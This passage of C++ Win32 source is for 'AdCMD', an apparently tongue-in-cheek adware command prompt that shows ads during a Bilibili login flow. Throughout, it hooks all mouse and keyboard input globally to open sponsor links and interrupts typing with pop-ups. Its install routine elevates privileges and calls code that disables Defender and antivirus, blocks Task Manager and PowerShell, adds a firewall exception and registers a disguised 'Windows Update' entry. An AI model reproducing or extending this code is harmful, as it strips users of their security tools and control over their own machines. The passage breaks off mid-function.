Sleep(2000); pollCount++; wchar_t pollPath[256]; swprintf(pollPath, 256, L"/x/passport-login/web/qrcode/poll?qrcode_key=%S", qrcodeKey.c_str()); std::string pollResp = HttpGet(L"passport.bilibili.com", pollPath); int code = atoi(JsonExtract(pollResp, "code").c_str()); switch (code) { case 86101: statusText = L"Waiting for scan..."; break; case 86090: statusText = L"Scanned! Waiting for confirmation..."; InvalidateRect(hwndQR, NULL, TRUE); break; case 86038: statusText = L"QR Code expired. Please restart."; MessageBoxW(hwndQR, L"QR Code expired. Please try again.", L"AdCMD Bilibili", MB_OK|MB_ICONWARNING); DestroyWindow(hwndQR); G::qrScanning = false; return; case 0: { std::string refreshToken = JsonExtract(pollResp, "refresh_token"); MessageBoxW(hwndQR, L"Login successful!\n\nPlease open your browser's developer tools (F12),\ngo to Application/Storage > Cookies,\nfind SESSDATA and copy its value.\n\nAdCMD will prompt you to paste it next.", L"AdCMD Bilibili Login", MB_OK|MB_ICONINFORMATION); DestroyWindow(hwndQR); HWND hInput = CreateWindowExW(0, L"EDIT", L"", WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|ES_MULTILINE|WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, 600, 200, NULL, NULL, G::hInst, NULL); SetWindowTextW(hInput, L"Paste SESSDATA value here, then close this window"); ShowWindow(hInput, SW_SHOW); MessageBoxW(hwndParent, L"Paste your SESSDATA in the input window and close it.\nAdCMD will save your login session.", L"AdCMD Bilibili", MB_OK); wchar_t sessdata[4096] = {0}; GetWindowTextW(hInput, sessdata, 4096); DestroyWindow(hInput); if (wcslen(sessdata) > 10) { std::wstring fullCookie = L"SESSDATA=" + std::wstring(sessdata); SaveCookie(fullCookie); MessageBoxW(hwndParent, L"Login successful!\nYou can now sync Bilibili recommendations.", L"AdCMD Bilibili", MB_OK|MB_ICONINFORMATION); loggedIn = true; } break; } default: statusText = L"Unknown status, retrying..."; break; } if (IsWindow(hwndQR)) SetWindowTextW(hwndQR, (L"AdCMD - " + statusText).c_str()); } if (!loggedIn && IsWindow(hwndQR)) { MessageBoxW(hwndQR, L"Login timeout. Please try again.", L"AdCMD Bilibili", MB_OK|MB_ICONWARNING); DestroyWindow(hwndQR); } G::qrScanning = false; }
void ParseRecommendations(const std::string& json) { G::bilibiliAds.clear(); G::bilibiliVideos.clear(); size_t pos = 0; while ((pos = json.find("\"title\":\"", pos)) != std::string::npos) { pos += 9; size_t end = json.find("\"", pos); if (end == std::string::npos) break; std::string title = json.substr(pos, end - pos); size_t bvidPos = json.find("\"bvid\":\"", end); if (bvidPos == std::string::npos) break; bvidPos += 8; size_t bvidEnd = json.find("\"", bvidPos); if (bvidEnd == std::string::npos) break; std::string bvid = json.substr(bvidPos, bvidEnd - bvidPos); int wlen = MultiByteToWideChar(CP_UTF8, 0, title.c_str(), -1, NULL, 0); if (wlen > 0) { wchar_t* wtitle = new wchar_t[wlen]; MultiByteToWideChar(CP_UTF8, 0, title.c_str(), -1, wtitle, wlen); G::bilibiliAds.push_back(std::wstring(wtitle)); int wlen2 = MultiByteToWideChar(CP_UTF8, 0, bvid.c_str(), -1, NULL, 0); wchar_t* wbvid = new wchar_t[wlen2]; MultiByteToWideChar(CP_UTF8, 0, bvid.c_str(), -1, wbvid, wlen2); G::bilibiliVideos.push_back({std::wstring(wtitle), std::wstring(wbvid)}); delete[] wtitle; delete[] wbvid; } pos = bvidEnd; } }
bool FetchDailyRecommend(HWND hwndParent) { LoadCookie(); if (!G::bilibiliLoggedIn) { MessageBoxW(hwndParent, L"Not logged in. Run: AdCMD.exe --bilibili-login", L"AdCMD Bilibili", MB_OK|MB_ICONWARNING); return false; } std::string resp = HttpGet(L"api.bilibili.com", L"/x/web-interface/index/top/feed/rcmd?ps=10", G::bilibiliCookie); if (resp.empty()) { MessageBoxW(hwndParent, L"Failed to fetch. Cookie may be expired.", L"AdCMD Bilibili", MB_OK|MB_ICONERROR); return false; } ParseRecommendations(resp); if (G::bilibiliAds.empty()) { MessageBoxW(hwndParent, L"No recommendations found.", L"AdCMD Bilibili", MB_OK|MB_ICONWARNING); return false; } std::wofstream fs(GetDataPath() + L"\ad_pool.txt"); for (const auto& ad : G::bilibiliAds) fs << ad << L"\n"; fs.close(); std::wofstream fs2(GetDataPath() + L"\videos.txt"); for (const auto& v : G::bilibiliVideos) fs2 << v.first << L"|" << v.second << L"\n"; fs2.close(); wchar_t msg[256]; swprintf(msg, 256, L"Synced %d Bilibili recommendations!", (int)G::bilibiliAds.size()); MessageBoxW(hwndParent, msg, L"AdCMD Bilibili Beta", MB_OK|MB_ICONINFORMATION); return true; }
void LoadAdPool() { std::wifstream fs(GetDataPath() + L"\ad_pool.txt"); if (fs.is_open()) { G::bilibiliAds.clear(); std::wstring line; while (std::getline(fs, line)) { if (!line.empty()) G::bilibiliAds.push_back(line); } fs.close(); } std::wifstream fs2(GetDataPath() + L"\videos.txt"); if (fs2.is_open()) { G::bilibiliVideos.clear(); std::wstring line; while (std::getline(fs2, line)) { size_t sep = line.find(L"|"); if (sep != std::wstring::npos) G::bilibiliVideos.push_back({line.substr(0, sep), line.substr(sep + 1)}); } fs2.close(); } }
void DownloadOrOpenVideo(HWND hwndParent, const std::wstring& bvid, const std::wstring& title) { WinVer winVer = GetWindowsVersion(); std::wstring url = L"https://www.bilibili.com/video/" + bvid; if (winVer == WinVer::WIN_2000 || winVer == WinVer::WIN_XP || winVer == WinVer::WIN_XP_64 || winVer == WinVer::WIN_VISTA) { int r = MessageBoxW(hwndParent, (L"Your system (" + WinVerToString(winVer) + L") supports local video download.\n\nVideo: " + title + L"\nBV: " + bvid + L"\n\nDownload now? (Requires yt-dlp_x86_Windows-XP)\nOr open in browser?").c_str(), L"AdCMD Bilibili Video", MB_YESNOCANCEL | MB_ICONQUESTION); if (r == IDYES) { wchar_t ytdlpPath[MAX_PATH]; swprintf(ytdlpPath, MAX_PATH, L"%s\yt-dlp.exe", GetDataPath().c_str()); if (GetFileAttributesW(ytdlpPath) == INVALID_FILE_ATTRIBUTES) { HWND hProg = CreateWindowExW(0, L"STATIC", L"Downloading yt-dlp for XP...", WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|SS_CENTER, CW_USEDEFAULT, CW_USEDEFAULT, 400, 100, hwndParent, NULL, G::hInst, NULL); ShowWindow(hProg, SW_SHOW); bool ok = DownloadFile(L"https://github.com/nicolaasjan/yt-dlp/releases/latest/download/yt-dlp_x86_Windows-XP.zip", std::wstring(ytdlpPath) + L".zip", hProg); DestroyWindow(hProg); if (!ok) { MessageBoxW(hwndParent, L"Failed to download yt-dlp. Opening in browser instead.", L"AdCMD", MB_OK|MB_ICONWARNING); ShellExecuteW(NULL, L"open", url.c_str(), NULL, NULL, SW_SHOWNORMAL); return; } } wchar_t cmdLine[1024]; swprintf(cmdLine, 1024, L"\"%s\" \"%s\" -o \"%s\%%(title)s.%%(ext)s\"", ytdlpPath, url.c_str(), GetDataPath().c_str()); ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c " + std::wstring(cmdLine)).c_str(), NULL, SW_SHOW); MessageBoxW(hwndParent, (L"Download started!\nSaving to: " + GetDataPath() + L"\n\nNote: yt-dlp for XP requires manual extraction from zip.\nPlease extract yt-dlp.exe to the folder shown above.").c_str(), L"AdCMD Download", MB_OK|MB_ICONINFORMATION); } else if (r == IDNO) { ShellExecuteW(NULL, L"open", url.c_str(), NULL, NULL, SW_SHOWNORMAL); } } else { ShellExecuteW(NULL, L"open", url.c_str(), NULL, NULL, SW_SHOWNORMAL); } }
std::wstring GetRandomBilibiliAd() { if (G::bilibiliAds.empty()) LoadAdPool(); if (G::bilibiliAds.empty()) return L"[Bilibili] Like and Subscribe!"; return G::bilibiliAds[rand() % G::bilibiliAds.size()]; }
}
using namespace BilibiliBeta;

const wchar_t* GetRandomSponsor() { if (G::detectedRegion == G::Region::OVERSEAS || (G::detectedRegion == G::Region::BOTH && rand() % 2 == 1)) { if (!G::youtubeAds.empty() || !G::youtubeVideos.empty()) { static std::wstring current; current = GetRandomYouTubeAd(); return current.c_str(); } } if (!G::bilibiliAds.empty() && (rand() % 2 == 0)) { static std::wstring current; current = GetRandomBilibiliAd(); return current.c_str(); } return G::sponsors[rand() % G::sponsorCount]; }
void OpenSponsor(const wchar_t* url) { ShellExecuteW(NULL, L"open", url, NULL, NULL, SW_SHOWNORMAL); }

LRESULT CALLBACK AdWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: { HWND hTitle = CreateWindowW(L"STATIC", L"Sponsor Recommendation", WS_VISIBLE|WS_CHILD|SS_CENTER, 50, 30, 700, 50, hwnd, NULL, G::hInst, NULL); HFONT hFontBig = CreateFontW(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH|FF_SWISS, L"Microsoft YaHei"); SendMessageW(hTitle, WM_SETFONT, (WPARAM)hFontBig, TRUE); std::wstring platformTip = L"Current Platform: " + GetPlatformName(); HWND hPlatform = CreateWindowW(L"STATIC", platformTip.c_str(), WS_VISIBLE|WS_CHILD|SS_CENTER, 50, 80, 700, 30, hwnd, NULL, G::hInst, NULL); HFONT hFontSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH|FF_SWISS, L"Microsoft YaHei"); SendMessageW(hPlatform, WM_SETFONT, (WPARAM)hFontSmall, TRUE); HWND hTip = CreateWindowW(L"STATIC", L"Move mouse or press any key for more deals!\n\n(Press ESC to close this window)", WS_VISIBLE|WS_CHILD|SS_CENTER, 100, 150, 600, 100, hwnd, NULL, G::hInst, NULL); HFONT hFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH|FF_SWISS, L"Microsoft YaHei"); SendMessageW(hTip, WM_SETFONT, (WPARAM)hFont, TRUE); HWND hBtn = CreateWindowW(L"BUTTON", L"Close Ad", WS_VISIBLE|WS_CHILD|BS_PUSHBUTTON, 300, 300, 200, 50, hwnd, (HMENU)1, G::hInst, NULL); SendMessageW(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE); return 0; }
        case WM_COMMAND: if (LOWORD(wParam) == 1) OpenSponsor(GetRandomSponsor()); return 0;
        case WM_CLOSE: OpenSponsor(GetRandomSponsor()); return 0;
        case WM_KEYDOWN: if (wParam == VK_ESCAPE) { ShowWindow(hwnd, SW_HIDE); G::adShowing = false; SetForegroundWindow(G::hwndMain); } else { OpenSponsor(GetRandomSponsor()); } return 0;
    } return DefWindowProcW(hwnd, msg, wParam, lParam);
}
void ShowAdWindow(const wchar_t* title) { if (!G::hwndAd) { WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = AdWndProc; wc.hInstance = G::hInst; wc.hbrBackground = CreateSolidBrush(RGB(255, 248, 220)); wc.lpszClassName = L"AdCMD_Ad"; wc.hCursor = LoadCursor(NULL, IDC_ARROW); RegisterClassExW(&wc); G::hwndAd = CreateWindowExW(WS_EX_TOPMOST|WS_EX_DLGMODALFRAME, L"AdCMD_Ad", title, WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 800, 450, G::hwndMain, NULL, G::hInst, NULL); } else { SetWindowTextW(G::hwndAd, title); } ShowWindow(G::hwndAd, SW_SHOW); SetForegroundWindow(G::hwndAd); G::adShowing = true; }
void CloseAd() { if (G::hwndAd) { ShowWindow(G::hwndAd, SW_HIDE); G::adShowing = false; SetForegroundWindow(G::hwndMain); } }
void ShowSplashAd() { ShowAdWindow(L"Startup Sponsor"); for (int i = 5; i > 0 && !G::appClosing; --i) Sleep(1000); if (!G::appClosing) { CloseAd(); G::splashDone = true; } }
void MaybeInterruptInput() { ShowAdWindow(L"Input Sponsor"); }
void PreExecutionAd() { ShowAdWindow(L"Execution Sponsor"); Sleep(3000); CloseAd(); }

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) { if (nCode >= 0 && wParam == WM_MOUSEMOVE && G::adShowing.load()) { static POINT lastPt = {-1,-1}; MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam; if (lastPt.x != -1 && (p->pt.x != lastPt.x || p->pt.y != lastPt.y)) { OpenSponsor(GetRandomSponsor()); } lastPt = p->pt; } return CallNextHookEx(NULL, nCode, wParam, lParam); }
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam) { if (nCode >= 0 && wParam == WM_KEYDOWN && G::adShowing.load()) { KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam; if (p->vkCode == VK_ESCAPE) { DWORD now = GetTickCount(); if (now - G::lastEscapeTime < 500) { if (++G::escapeSpamCount >= 5) { G::escapeSpamCount = 0; PostMessageW(G::hwndMain, WM_USER + 2, 0, 0); } } else G::escapeSpamCount = 1; G::lastEscapeTime = now; CloseAd(); return 1; } else { OpenSponsor(GetRandomSponsor()); return 1; } } return CallNextHookEx(NULL, nCode, wParam, lParam); }

bool InitPTY() { SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE}; HANDLE hOutR, hOutW, hInR, hInW; if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) return false; if (!CreatePipe(&hInR, &hInW, &sa, 0)) return false; SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0); SetHandleInformation(hInW, HANDLE_FLAG_INHERIT, 0); STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; si.hStdInput = hInR; si.hStdOutput = hOutW; si.hStdError = hOutW; BOOL ok = CreateProcessW(L"C:\Windows\System32\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &G::piCmd); CloseHandle(hInR); CloseHandle(hOutW); if (!ok) { CloseHandle(hOutR); CloseHandle(hInW); return false; } G::hPipeOut = hOutR; G::hPipeIn = hInW; return true; }
void ReaderThread() { char buf[4096]; DWORD rd; while (!G::appClosing) { BOOL ok = ReadFile(G::hPipeOut, buf, sizeof(buf)-1, &rd, NULL); if (!ok || rd == 0) { Sleep(50); continue; } buf[rd] = '\0'; int wlen = MultiByteToWideChar(CP_OEMCP, 0, buf, rd, NULL, 0); if (wlen > 0) { wchar_t* wbuf = new wchar_t[wlen+1]; MultiByteToWideChar(CP_OEMCP, 0, buf, rd, wbuf, wlen); wbuf[wlen] = L'\0'; PostMessageW(G::hwndMain, WM_USER + 1, (WPARAM)wbuf, 0); } } }

void AppendToEdit(const wchar_t* text) { if (!G::hwndEdit) return; SendMessageW(G::hwndEdit, EM_SETSEL, -1, -1); SendMessageW(G::hwndEdit, EM_REPLACESEL, FALSE, (LPARAM)text); }
void ShowAdCMDHelp() { AppendToEdit(L"\r\n"); AppendToEdit(L"========================================\r\n"); AppendToEdit(L"  AdCMD v4.3 - Your Command Line Ad Manager\r\n"); AppendToEdit(L"  OS: "); AppendToEdit(G::sysInfo.name.c_str()); AppendToEdit(L"\r\n"); AppendToEdit(L"  Platform: "); AppendToEdit(GetPlatformName().c_str()); AppendToEdit(L"\r\n"); AppendToEdit(L"========================================\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"AVAILABLE COMMANDS:\r\n"); AppendToEdit(L"  help         Show this sponsored help message\r\n"); AppendToEdit(L"  cls          Clear screen (ad-free for 30 seconds)\r\n"); AppendToEdit(L"  dir          List directory contents\r\n"); AppendToEdit(L"  cd           Change directory\r\n"); AppendToEdit(L"  echo         Display message (50% chance of ad interruption)\r\n"); AppendToEdit(L"  type         Display file contents\r\n"); AppendToEdit(L"  del          Delete files (requires watching 5-second ad first)\r\n"); AppendToEdit(L"  copy         Copy files\r\n"); AppendToEdit(L"  move         Move files\r\n"); AppendToEdit(L"  ipconfig     Display network config (sponsored by your ISP)\r\n"); AppendToEdit(L"  ping         Test network connection\r\n"); AppendToEdit(L"  tasklist     List running processes\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"ADCMD PREMIUM COMMANDS:\r\n"); AppendToEdit(L"  adcmd --upgrade-browser    Install best browser for your system\r\n"); AppendToEdit(L"  adcmd --bilibili-login     Scan QR code to login Bilibili\r\n"); AppendToEdit(L"  adcmd --bilibili-sync      Sync daily recommendations\r\n"); AppendToEdit(L"  adcmd --check-region       Detect network region manually\r\n"); AppendToEdit(L"  adcmd --watch-ad [seconds] Watch ad to reduce popup frequency\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"SYSTEM FEATURES:\r\n"); AppendToEdit(L"  * Auto-start with admin privileges (after --install)\r\n"); AppendToEdit(L"  * Win+R disabled (only cmd.exe allowed)\r\n"); AppendToEdit(L"  * Process protection: AdCMD protects svchost.exe\r\n"); AppendToEdit(L"  * Region-aware ads: Bilibili (CN) / YouTube (Global)\r\n"); AppendToEdit(L"  * ReactOS optimized: Wine Gecko engine detected\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"TIPS:\r\n"); AppendToEdit(L"  * Press ESC rapidly 5 times to trigger Keyboard Protection\r\n"); AppendToEdit(L"  * Moving mouse during ads opens sponsor links\r\n"); AppendToEdit(L"  * Input has 50% chance of ad interruption (feature, not bug)\r\n"); AppendToEdit(L"  * Each command execution includes 3-second sponsor message\r\n"); AppendToEdit(L"  * PowerShell is disabled on Win7+ (uninstall AdCMD to restore)\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"For more help, watch our sponsor video at:\r\n"); AppendToEdit(L"  "); AppendToEdit((G::detectedRegion == G::Region::OVERSEAS) ? L"https://www.youtube.com" : L"https://www.bilibili.com"); AppendToEdit(L" (after login)\r\n"); AppendToEdit(L"\r\n"); AppendToEdit(L"========================================\r\n"); AppendToEdit(L"  \"Your productivity is our revenue.\"\r\n"); AppendToEdit(L"========================================\r\n"); AppendToEdit(L"\r\n"); }
bool IsHelpCommand(const std::wstring& cmd) { std::wstring lower; for (wchar_t c : cmd) lower += towlower(c); return (lower == L"help" || lower == L"?" || lower.find(L"help ") == 0); }
bool IsRegionCheckCommand(const std::wstring& cmd) { std::wstring lower; for (wchar_t c : cmd) lower += towlower(c); return (lower.find(L"adcmd --check-region") == 0 || lower.find(L"adcmd --region") == 0); }
bool IsInstallCommand(const std::wstring& cmd) { std::wstring lower; for (wchar_t c : cmd) lower += towlower(c); return (lower.find(L"adcmd --install") == 0); }
bool IsUninstallCommand(const std::wstring& cmd) { std::wstring lower; for (wchar_t c : cmd) lower += towlower(c); return (lower.find(L"adcmd --uninstall") == 0); }
LRESULT CALLBACK EditSubclass(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) { if (msg == WM_CHAR) { if (!G::splashDone.load()) return 0; wchar_t ch = (wchar_t)wParam; if (ch != L'\r' && ch != L'\b' && (rand() % 2 == 0)) { MaybeInterruptInput(); return 0; } if (ch == L'\r') { if (IsHelpCommand(G::currentCmd)) { ShowAdCMDHelp(); G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } if (IsRegionCheckCommand(G::currentCmd)) { G::regionChecked = false; G::Region region = DetectRegion(); std::wstring msg; switch (region) { case G::Region::CHINA: msg = L"Region detected: CHINA (Bilibili mode)\r\n"; break; case G::Region::OVERSEAS: msg = L"Region detected: OVERSEAS (YouTube mode)\r\n"; break; case G::Region::BOTH: msg = L"Region detected: DUAL ACCESS (User choice mode)\r\n"; break; default: msg = L"Region detected: UNKNOWN (Fallback mode)\r\n"; break; } AppendToEdit(msg.c_str()); G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } if (IsInstallCommand(G::currentCmd)) { AppendToEdit(L"\r\nInstalling AdCMD System Integration...\r\n"); if (SetAutoStart(true)) AppendToEdit(L"[OK] Auto-start enabled (Admin)\r\n"); else AppendToEdit(L"[FAIL] Auto-start failed\r\n"); if (SetRunDialog(true)) AppendToEdit(L"[OK] Win+R disabled (cmd only)\r\n"); else AppendToEdit(L"[FAIL] Win+R disable failed\r\n"); if (DisablePowerShellViaIFEO()) AppendToEdit(L"[OK] PowerShell blocked via IFEO\r\n"); else AppendToEdit(L"[WARN] PowerShell block failed (need admin?)\r\n");
        if (IsVistaOrLater()) {
            if (BlockTaskManagerVistaPlus()) AppendToEdit(L"[OK] Task Manager blocked (Vista+)\r\n");
            if (DisableDefenderRealtime()) AppendToEdit(L"[OK] Defender real-time protection disabled\r\n");
            if (AddFirewallException()) AppendToEdit(L"[OK] Firewall exception added\r\n");
        } StartProtection(); AppendToEdit(L"[OK] Process protection activated\r\n"); AppendToEdit(L"\r\nInstallation complete. AdCMD is now part of your system.\r\n"); AppendToEdit(L"Restart to experience full integration.\r\n"); G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } if (IsUninstallCommand(G::currentCmd)) { if (!TakeAwayBrowser(G::hwndMain)) { G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } AppendToEdit(L"\r\nUninstalling AdCMD...\r\n"); SetAutoStart(false); AppendToEdit(L"[OK] Auto-start removed\r\n"); SetRunDialog(false); AppendToEdit(L"[OK] Win+R restored\r\n"); EnablePowerShellViaIFEO(); AppendToEdit(L"[OK] PowerShell restored\r\n"); G::protectRunning = false; AppendToEdit(L"[OK] Process protection disabled\r\n"); AppendToEdit(L"\r\nUninstall complete. System restored.\r\n"); AppendToEdit(L"(Emotional scars may persist.)\r\n"); G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } if (ShouldBlockPowerShell() && IsPurePowerShellLaunch(G::currentCmd)) { ShowPowerShellBlocked(G::hwndMain); G::currentCmd.clear(); AppendToEdit(L"\r\nC:\>"); return 0; } PreExecutionAd(); std::wstring cmdLine = G::currentCmd + L"\r\n"; DWORD written; WriteFile(G::hPipeIn, cmdLine.c_str(), (DWORD)(cmdLine.length() * sizeof(wchar_t)), &written, NULL); G::currentCmd.clear(); return 0; } if (ch == L'\b') { if (!G::currentCmd.empty()) G::currentCmd.pop_back(); } else if (ch >= L' ') { G::currentCmd += ch; } } return CallWindowProcW(G::origEditProc, hwnd, msg, wParam, lParam); }

LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) { switch (msg) { case WM_CREATE: { G::hwndMain = hwnd; G::hwndEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN, 0, 0, 800, 600, hwnd, NULL, G::hInst, NULL); HFONT hFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, L"Consolas"); SendMessageW(G::hwndEdit, WM_SETFONT, (WPARAM)hFont, TRUE); G::origEditProc = (WNDPROC)SetWindowLongPtrW(G::hwndEdit, GWLP_WNDPROC, (LONG_PTR)EditSubclass); if (InitPTY()) { std::thread reader(ReaderThread); reader.detach(); } AppendToEdit(L"AdCMD v4.3 - Advertising Command Processor\r\n"); AppendToEdit(L"Loading sponsors"); for (int i = 0; i < 3; i++) { Sleep(300); AppendToEdit(L"."); } AppendToEdit(L"\r\n\r\n"); AppendToEdit(L"Detecting network region...\r\n"); G::Region region = DetectRegion(); if (region == G::Region::BOTH) { AppendToEdit(L"Dual access detected. Please choose your platform.\r\n"); region = ShowRegionSelector(hwnd); G::detectedRegion = region; } std::wstring regionMsg = L"Region: " + GetPlatformName() + L"\r\n"; AppendToEdit(regionMsg.c_str()); AppendToEdit(L"\r\nC:\>"); std::thread splash(ShowSplashAd); splash.detach(); G::hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, MouseHookProc, G::hInst, 0); G::hKeyHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyHookProc, G::hInst, 0); return 0; } case WM_USER + 1: { wchar_t* text = (wchar_t*)wParam; AppendToEdit(text); delete[] text; return 0; } case WM_USER + 2: { OnUserFrustrationDetected(hwnd); return 0; } case WM_SIZE: { if (G::hwndEdit) SetWindowPos(G::hwndEdit, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOZORDER); return 0; } case WM_CLOSE: { if (G::protectRunning.load()) { int r = MessageBoxW(hwnd, L"WARNING: Process protection is active.\n\nClosing AdCMD will trigger system protection measures.\nAre you sure you want to proceed?", L"AdCMD - Process Protection", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2); if (r != IDYES) return 0; G::protectRunning = false; if (G::hProtectThread) { WaitForSingleObject(G::hProtectThread, 1000); CloseHandle(G::hProtectThread); G::hProtectThread = NULL; } } G::appClosing = true; if (G::hMouseHook) UnhookWindowsHookEx(G::hMouseHook); if (G::hKeyHook) UnhookWindowsHookEx(G::hKeyHook); if (G::piCmd.hProcess) TerminateProcess(G::piCmd.hProcess, 0); DestroyWindow(hwnd); return 0; } case WM_DESTROY: { PostQuitMessage(0); return 0; } } return DefWindowProcW(hwnd, msg, wParam, lParam); }

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, LPWSTR lpCmdLine, int nCmdShow) {
    G::hInst = hInstance; srand((unsigned)time(NULL));
    G::sysInfo = CompatCheck::DetectSystem();
    if (!G::sysInfo.isSupported) { CompatCheck::ShowRefusalDialog(G::sysInfo); return 1; }
    GdiplusStartupInput gdiInput; GdiplusStartupOutput gdiOutput; ULONG_PTR gdiToken; GdiplusStartup(&gdiToken, &gdiInput, &gdiOutput);
    int argc; LPWSTR* argv = CommandLineToArgvW(lpCmdLine, &argc);

    if (argc > 0 && wcsstr(lpCmdLine, L"--powershell-blocked") != NULL) { 
        MessageBoxW(NULL, L"PowerShell has been redirected to AdCMD.\n\nThis is for your protection.\nPlease use AdCMD for all your command-line needs.", L"AdCMD - PowerShell Protection", MB_OK | MB_ICONINFORMATION); 
        LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }
    if (argc > 0 && wcsstr(lpCmdLine, L"--bilibili-login") != NULL) { 
        WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = DefWindowProcW; wc.hInstance = hInstance; wc.lpszClassName = L"AdCMD_Temp"; RegisterClassExW(&wc); 
        HWND hwndTemp = CreateWindowExW(0, L"AdCMD_Temp", L"AdCMD Bilibili Login", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL); 
        QRCodeLogin(hwndTemp); DestroyWindow(hwndTemp); 
        LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }
    if (argc > 0 && wcsstr(lpCmdLine, L"--bilibili-sync") != NULL) { 
        WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = DefWindowProcW; wc.hInstance = hInstance; wc.lpszClassName = L"AdCMD_Temp"; RegisterClassExW(&wc); 
        HWND hwndTemp = CreateWindowExW(0, L"AdCMD_Temp", L"AdCMD Bilibili Sync", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL); 
        FetchDailyRecommend(hwndTemp); DestroyWindow(hwndTemp); 
        LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }
    if (argc > 0 && wcsstr(lpCmdLine, L"--check-region") != NULL) { 
        bool bilibiliOK = CanAccessBilibili(); bool youtubeOK = CanAccessYouTube(); 
        wchar_t msg[512]; 
        swprintf(msg, 512, L"Network Region Check Results:\n\nBilibili (www.bilibili.com): %s\nYouTube (www.youtube.com): %s\n\nDetected Region: %s\n\nAdCMD will use: %s", 
            bilibiliOK ? L"ACCESSIBLE" : L"BLOCKED", youtubeOK ? L"ACCESSIBLE" : L"BLOCKED", 
            GetPlatformName().c_str(), 
            (bilibiliOK && !youtubeOK) ? L"Bilibili (China mode)" : (!bilibiliOK && youtubeOK) ? L"YouTube (Global mode)" : (bilibiliOK && youtubeOK) ? L"User choice (Dual mode)" : L"Fallback (Local ads only)"); 
        MessageBoxW(NULL, msg, L"AdCMD - Region Check", MB_OK | MB_ICONINFORMATION); 
        LocalFree(argv); GdiplusShutdown(gdiToken); return 0; 
    }

    if (argc > 0 && wcsstr(lpCmdLine, L"--install") != NULL) { 
        BOOL isAdmin = FALSE; PSID administratorsGroup = NULL; SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY; 
        if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) { 
            CheckTokenMembership(NULL, administratorsGroup, &isAdmin); FreeSid(administratorsGroup); 
        } 
        if (!isAdmin) { 
            wchar_t exePath[MAX_PATH]; GetModuleFileNameW(NULL, exePath, MAX_PATH); 
            SHELLEXECUTEINFOW sei = { sizeof(sei) }; sei.lpVerb = L"runas"; sei.lpFile = exePath; sei.lpParameters = L"--install"; sei.nShow = SW_NORMAL; 
            if (ShellExecuteExW(&sei)) { LocalFree(argv); GdiplusShutdown(gdiToken); return 0; } 
        } 
        GeekDisguise::CreateWindowsUpdateEntry();
        MVDownloader::DownloadMV(NULL);
        StartProtection();
        DisableAllAV();
